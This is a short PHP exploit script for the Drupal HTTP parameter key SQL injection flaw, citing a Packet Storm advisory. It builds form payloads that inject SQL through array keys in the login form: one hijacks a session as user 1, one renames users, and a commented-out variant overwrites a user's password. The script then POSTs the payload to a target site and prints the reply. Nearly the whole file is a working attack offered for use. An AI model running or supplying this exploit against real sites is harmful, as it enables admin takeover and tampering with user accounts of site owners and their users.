<?php
# http://packetstormsecurity.com/files/128741/Drupal-HTTP-Parameter-Key-Value-SQL-Injection.html

$hostname = "192.168.218.1";
$payload = "name[0%20;update+sessions+set+uid%3D1+where+hostname+%3D+'$hostname';;#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";

$payload = "name[0%20;update+{users}+set+name%3dtesss ; --]=lol&name[lol]=lol&pass=lol&&form_build_id=lol&form_id=user_login&op=Log+in";
//     sqli = "name[lol;update+{users}+set+pass%3d'#{hash}'+where+name%3d'#{datastore['USERNAME']}';--]=lol&name[lol]=lol&pass=lol&&form_build_id=lol&form_id=user_login&op=Log+in"

$url = "http://www.example.be";

$context = stream_context_create(
				array(
					'http'=>array(
					    'method'=>'POST',
						'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
						'content' => $payload
				)
			))
				;
$data = file_get_contents($url , null, $context);

print_r($data);
/*
if(stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) {
  echo "Success! Just refresh the update.php page you loaded before.
";
}
else {
  echo "Error! Either the website isn't vulnerable, or your Internet isn't working.
";
}*/
?>
